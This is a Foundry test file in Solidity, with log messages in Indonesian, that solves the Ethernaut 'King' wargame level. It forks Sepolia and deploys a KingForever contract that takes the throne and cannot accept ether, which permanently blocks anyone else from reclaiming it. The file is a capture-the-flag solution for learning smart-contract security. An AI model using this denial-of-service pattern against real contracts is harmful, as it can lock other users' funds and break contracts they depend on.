// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../10-King/KingFactory.sol";
import "forge-std/Test.sol";

contract KingAttack is Test {
    function test() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address kacrut = makeAddr("kacrut");
        vm.deal(kacrut, 10 ether);
        Ethernaut ethernaut = new Ethernaut();
        KingFactory factory = new KingFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(kacrut, kacrut);
        address addr = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
        King king = King(payable(addr));
        emit log("setup done!\nGoal: menjadi raja!");
        bool bukanRaja = king._king() != kacrut;
        assertTrue(bukanRaja);
        emit log("klaim raja");
        address(king).call{value: 1 ether}("");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertFalse(sukses);
        emit log("status raja diklaim balik");
        emit log("kita harus membuat kontrak yang tidak mungkin menerima ether supaya menjadi raja selamanya!");
        KingForever kingForever = new KingForever{value: 1 ether}(payable(address(king)));
        sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}

contract KingForever {
    constructor(address payable _king) payable {
        King king = King(_king);
        address(king).call{value: msg.value}("");
    }
}
